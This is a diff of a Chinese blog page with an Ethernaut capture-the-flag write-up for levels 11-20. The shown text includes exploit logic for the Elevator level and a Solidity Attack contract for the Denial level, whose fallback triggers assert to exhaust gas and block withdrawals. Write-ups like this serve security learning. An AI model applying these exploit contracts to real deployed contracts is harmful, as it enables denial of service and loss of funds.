@@ -1,82 +1,210 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8">
-  
-  
-  
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <title>
-    Ethernaut 11-20 |
     
-    yichen&#39;s blog</title>
-  
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Ethernaut 11-20 | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="Elevator目标：成为 top，让变量 top 变为 true代码： 123456789101112131415pragma solidity ^0.4.18;interface Building &amp;#123;  function isLastFloor(uint) view public returns (bool);&amp;#125;&#x2F;&#x2F;定义了一个接口,这个函数返回你是不是在最顶层contrac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut 11-20">
+<meta property="og:url" content="https://yichen115.github.io/2020/05/07/nqua9o/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="Elevator目标：成为 top，让变量 top 变为 true代码： 123456789101112131415pragma solidity ^0.4.18;interface Building &amp;#123;  function isLastFloor(uint) view public returns (bool);&amp;#125;&#x2F;&#x2F;定义了一个接口,这个函数返回你是不是在最顶层contrac">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589702583547-96fdbc00-cbd6-4fdf-8b59-8d2cf38c1dd3.png#align=left&display=inline&height=507&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1206&size=191496&status=done&style=none&width=659">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589702615062-91a7ed77-e2f5-4cbc-acfe-352ef19c3676.png#align=left&display=inline&height=109&margin=%5Bobject%20Object%5D&name=image.png&originHeight=99&originWidth=202&size=3625&status=done&style=stroke&width=223">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588821462735-75b03782-6dea-4871-ad6f-ce1f695e0665.png#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=788&size=80486&status=done&style=stroke&width=419">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588822677581-bf5bcdab-024e-4c98-ae36-7a227f53aa72.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&name=image.png&originHeight=283&originWidth=939&size=50152&status=done&style=stroke&width=637">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588822730302-91c4617c-a687-48f6-995f-a70e281e0054.png#align=left&display=inline&height=301&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=790&size=78842&status=done&style=stroke&width=395">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588836843530-c2c2ec8f-b4c1-480f-9afc-28540c6507a1.png#align=left&display=inline&height=361&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1920&size=164954&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588837154513-b16d203b-cbf4-493e-a0a7-5e1de6072079.png#align=left&display=inline&height=361&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1920&size=163167&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588837285033-351bc1d0-ac93-44cc-952e-900355557525.png#align=left&display=inline&height=361&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1920&size=168011&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588838484363-61a45713-7cb1-4ece-833a-b915859b21ed.png#align=left&display=inline&height=361&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1920&size=170228&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588839943384-b60a09ee-5171-462c-a498-0e509f981c50.png#align=left&display=inline&height=423&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1637&size=145247&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588854127387-5d94e7d9-0771-4f47-9ca7-0113f67d69bf.png#align=left&display=inline&height=340&margin=%5Bobject%20Object%5D&name=image.png&originHeight=600&originWidth=783&size=79842&status=done&style=stroke&width=444">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588856590352-0f980209-6d3f-406d-87c0-8f8cc0946d51.png#align=left&display=inline&height=173&margin=%5Bobject%20Object%5D&name=image.png&originHeight=197&originWidth=312&size=9304&status=done&style=stroke&width=274">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588856635596-a6cf6365-2520-4f8b-9c3b-c998e98852e2.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=212&originWidth=943&size=42644&status=done&style=stroke&width=594">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588856671528-979c0cae-f327-4b90-af81-04f2833ddf32.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&name=image.png&originHeight=196&originWidth=305&size=8831&status=done&style=stroke&width=237">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1588856700354-ef743149-456e-4101-88ac-2b5392a087a3.png#align=left&display=inline&height=303&margin=%5Bobject%20Object%5D&name=image.png&originHeight=605&originWidth=788&size=72014&status=done&style=stroke&width=394">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589761154008-f3242d3d-ac26-476b-b144-7990c95f001e.png#align=left&display=inline&height=464&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1624&size=110051&status=done&style=stroke&width=812">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589761407802-240ae4b2-e495-4a75-a024-02bf15bf48f6.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&name=image.png&originHeight=310&originWidth=935&size=47793&status=done&style=stroke&width=580">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589096923078-a8c68e7d-492d-41f7-816f-ac102285ca19.png#align=left&display=inline&height=299&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=784&size=80291&status=done&style=stroke&width=392">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589114179269-78af7a7b-f10a-417a-b5a9-20ba58baa264.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=image.png&originHeight=203&originWidth=935&size=25227&status=done&style=stroke&width=649">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589114055086-e218100e-b810-414f-81f9-c63456888827.png#align=left&display=inline&height=300&margin=%5Bobject%20Object%5D&name=image.png&originHeight=599&originWidth=784&size=80719&status=done&style=stroke&width=392">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589115365206-3785ee23-127b-4470-89e7-dbe158fad166.png#align=left&display=inline&height=400&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1029&originWidth=1920&size=269912&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589115426932-5318f3d4-7111-480e-8639-754db4cdb80b.png#align=left&display=inline&height=418&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1658&size=113826&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589115920566-92ff671c-c62e-4893-bb6c-d76bdc59dd11.png#align=left&display=inline&height=418&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1657&size=109518&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589116087438-af01846e-a80b-4f3e-b235-55c6878f167f.png#align=left&display=inline&height=343&margin=%5Bobject%20Object%5D&name=image.png&originHeight=599&originWidth=786&size=80405&status=done&style=stroke&width=450">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589767390887-fad58366-bc49-4be6-a958-dae0f573972f.png#align=left&display=inline&height=498&margin=%5Bobject%20Object%5D&name=image.png&originHeight=996&originWidth=1920&size=236708&status=done&style=stroke&width=960">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589767546947-9b2c5b00-b1a8-40e1-b175-49972d74052a.png#align=left&display=inline&height=453&margin=%5Bobject%20Object%5D&name=image.png&originHeight=905&originWidth=1658&size=107220&status=done&style=stroke&width=829">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589120250202-77c82d8d-75e6-4fff-a520-7eebb4ce0c6c.png#align=left&display=inline&height=299&margin=%5Bobject%20Object%5D&name=image.png&originHeight=597&originWidth=783&size=74182&status=done&style=stroke&width=392">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589121078356-523c787d-dd63-4715-8719-966e6e71ca8d.png#align=left&display=inline&height=280&margin=%5Bobject%20Object%5D&name=image.png&originHeight=353&originWidth=666&size=31340&status=done&style=stroke&width=528">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589121660662-24e00c4b-eb40-41b1-9ade-76868c910d03.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=996&originWidth=1920&size=138237&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589121759956-815fdd4c-78fe-4768-9080-6a30589b6d9d.png#align=left&display=inline&height=387&margin=%5Bobject%20Object%5D&name=image.png&originHeight=997&originWidth=1920&size=145925&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589933976110-e35eb7b7-d094-4862-af4c-bd1010556bd9.png#align=left&display=inline&height=472&margin=%5Bobject%20Object%5D&name=image.png&originHeight=944&originWidth=1920&size=132487&status=done&style=stroke&width=960">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589122132463-1a3f8f46-4e30-49ce-aed9-6c6bcf20a1e1.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=1450&size=42518&status=done&style=stroke&width=725">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589122235999-b5add0c3-128a-4b34-8a39-532574cdee28.png#align=left&display=inline&height=299&margin=%5Bobject%20Object%5D&name=image.png&originHeight=598&originWidth=786&size=80396&status=done&style=stroke&width=393">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589122575411-1f04b7b3-bfac-4e2b-b72b-85da2c66192b.png#align=left&display=inline&height=361&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1920&size=175505&status=done&style=stroke&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589122647418-bd2a4be9-2576-4458-b07d-1999dcf9f102.png#align=left&display=inline&height=300&margin=%5Bobject%20Object%5D&name=image.png&originHeight=599&originWidth=785&size=81711&status=done&style=stroke&width=393">
+<meta property="article:published_time" content="2020-05-07T02:49:10.000Z">
+<meta property="article:modified_time" content="2020-07-15T23:43:41.934Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1589702583547-96fdbc00-cbd6-4fdf-8b59-8d2cf38c1dd3.png#align=left&display=inline&height=507&margin=%5Bobject%20Object%5D&name=image.png&originHeight=928&originWidth=1206&size=191496&status=done&style=none&width=659">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
     <link rel="shortcut icon" href="/favicon.ico">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 
-  
+    <!-- custom head -->
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-  
-  
-<script src="/js/pace.min.js"></script>
-
-<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
-<main class="content">
-  <section class="outer">
-<meta name="referrer" content="no-referrer" />
-  <article id="post-nqua9o" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+    <div id="loading" class="active"></div>
 
-    <div class="article-inner">
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
         
-            <header class="article-header">
-                
-  
-    <h1 class="article-title" itemprop="name">
-      Ethernaut 11-20
-    </h1>
-  
-  
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Ethernaut 11-20</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Ethernaut 11-20</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-05-07T02:49:10.000Z" itemprop="datePublished" class="page-time">
+  2020-05-07
+</time>
 
 
+            
+        </h5>
+    </div>
+
+    
 
 
-            </header>
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Elevator"><span class="post-toc-number">1.</span> <span class="post-toc-text">Elevator</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Privacy"><span class="post-toc-number">2.</span> <span class="post-toc-text">Privacy</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Gatekeeper-One"><span class="post-toc-number">3.</span> <span class="post-toc-text">Gatekeeper One</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Gatekeeper-Two"><span class="post-toc-number">4.</span> <span class="post-toc-text">Gatekeeper Two</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Naught-Coin"><span class="post-toc-number">5.</span> <span class="post-toc-text">Naught Coin</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Preservation"><span class="post-toc-number">6.</span> <span class="post-toc-text">Preservation</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Locked"><span class="post-toc-number">7.</span> <span class="post-toc-text">Locked</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Recovery"><span class="post-toc-number">8.</span> <span class="post-toc-text">Recovery</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#MagicNumber"><span class="post-toc-number">9.</span> <span class="post-toc-text">MagicNumber</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Alien-Codex"><span class="post-toc-number">10.</span> <span class="post-toc-text">Alien Codex</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Denial"><span class="post-toc-number">11.</span> <span class="post-toc-text">Denial</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-nqua9o"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Ethernaut 11-20</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-05-07 10:49:10" datetime="2020-05-07T02:49:10.000Z"  itemprop="datePublished">2020-05-07</time>
+
             
 
-                
-                    <div class="article-meta">
-                        <a href="/2020/05/07/nqua9o/" class="article-date">
-  <time datetime="2020-05-07T02:49:10.000Z" itemprop="datePublished">2020-05-07</time>
-</a>
-                            
-                    </div>
-                    
 
-                        
-                            
-    <div class="tocbot"></div>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
 
 
-
-
-
-                                
-
-                                    <div class="article-entry" itemprop="articleBody">
-                                        
-
-
-                                            
-
-                                                
-                                                                    <h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>目标：成为 top，让变量 top 变为 true<br>代码：</p>
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><p>目标：成为 top，让变量 top 变为 true<br>代码：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;//定义了一个接口,这个函数返回你是不是在最顶层</span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;<span class="comment">//布尔型变量,是否是top,默认false</span></span><br><span class="line">  uint public floor;<span class="comment">//楼层</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line">    <span class="keyword">if</span> (!building.isLastFloor(_floor)) &#123;<span class="comment">//如果不是最顶层的话就进入if</span></span><br><span class="line">      floor = _floor;<span class="comment">//拿到你的_floor</span></span><br><span class="line">      top = building.isLastFloor(floor);<span class="comment">//让top等于判断结果,所以还是false</span></span><br><span class="line">    &#125;<span class="comment">//但是如果你是top的话,没有改top的机会,所以还是false</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>题目声明了 Building 接口中的那个  isLastFloor 函数，我们可以自己编写<br>只要让他反转两次就可以啦</p>
@@ -240,177 +368,303 @@
 <p>还有一种方法是 assert 函数触发异常之后会消耗所有可用的 gas，消耗了所有的 gas 那就没法转账了</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.23</span>;</span><br><span class="line">contract Denial &#123;</span><br><span class="line">    address public partner;</span><br><span class="line">    address public constant owner = <span class="number">0xA9E</span>;</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setWithdrawPartner</span>(<span class="params">address _partner</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        uint amountToSend = address(<span class="keyword">this</span>).balance/<span class="number">100</span>;</span><br><span class="line">        partner.call.value(amountToSend)();</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">contractBalance</span>(<span class="params"></span>) <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Attack&#123;</span><br><span class="line">    address instance_address = 题目合约地址;</span><br><span class="line">    Denial target = Denial(instance_address);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        target.setWithdrawPartner(address(<span class="keyword">this</span>));</span><br><span class="line">        target.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">        assert(<span class="number">0</span>==<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-                                                                        
-                                    </div>
-                                    <footer class="article-footer">
-                                        <a data-url="http://yoursite.com/2020/05/07/nqua9o/" data-id="ckco0gl1n000avgu92j0n99jq" class="article-share-link">
-                                            Share
-                                        </a>
-                                        
-                                    </footer>
-
-    </div>
-
-    
-        
-  <nav class="article-nav">
-    
-      <a href="/2020/05/11/bzi777/" class="article-nav-link">
-        <strong class="article-nav-caption">Newer</strong>
-        <div class="article-nav-title">
-          
-            five86-1
-          
         </div>
-      </a>
+
+        <blockquote class="post-copyright">
     
-    
-      <a href="/2020/05/04/kqhkza/" class="article-nav-link">
-        <strong class="article-nav-caption">Older</strong>
-        <div class="article-nav-title">Ethernaut 0-10</div>
-      </a>
-    
-  </nav>
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2020-07-15T23:43:41.934Z" itemprop="dateUpdated">2020-07-16 07:43:41</time>
+</span><br>
 
 
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2020/05/07/nqua9o/" target="_blank" rel="external">https://yichen115.github.io/2020/05/07/nqua9o/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
             
 
-                
-                    
-    <div class="vcomments" id="vcomments"></div>
+            
+<div class="page-share-wrap">
     
-<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
 
-        <script>
-            new Valine({
-                el: '#vcomments',
-                appId: '',
-                appKey: '',
-                notify: 'false',
-                verify: 'true',
-                avatar: 'mp',
-                pageSize: '10',
-                placeholder: '请输入...'
-            })
-        </script>
-        
-                        
-                            
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/05/07/nqua9o/&title=《Ethernaut 11-20》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/05/07/nqua9o/&title=《Ethernaut 11-20》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/05/07/nqua9o/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Ethernaut 11-20》 — yichen's blog&url=https://yichen115.github.io/2020/05/07/nqua9o/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/05/07/nqua9o/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/05/11/bzi777/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">five86-1</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/05/04/kqhkza/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Ethernaut 0-10</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </article>
-</section>
-  <footer class="footer">
-  <div class="outer">
-    <div class="float-right">
-      <ul class="list-inline">
-  
-    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
-  
-    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
-  
-</ul>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
     </div>
-    <ul class="list-inline">
-      <li>&copy; 2020 yichen&#39;s blog</li>
-      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
-      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
-    </ul>
-  </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
